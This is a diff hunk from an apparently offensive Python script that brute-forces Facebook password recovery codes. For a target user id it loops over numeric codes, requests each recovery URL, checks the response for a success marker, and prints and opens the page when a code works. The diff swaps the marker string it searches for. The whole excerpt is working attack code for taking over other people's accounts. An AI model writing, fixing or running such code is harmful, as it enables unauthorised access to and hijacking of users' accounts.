@@ -48,7 +48,7 @@ while True:
         		
         		rep= 'https://www.facebook.com/recover/password?u='+target+'&n='+str(l)+'&s=23&exp_locale=ar_AR&redirect_from=button'
         		gets= urlopen(rep).read()
-        		search = re.search('account_recovery_password_reset_label', gets.decode('utf-8')
+        		search = re.search('password_new', gets.decode('utf-8'))
         		if search:
         			print ("The Code "+str(l)+" is Correct ^___^ ")
         			webbrowser.open(rep)
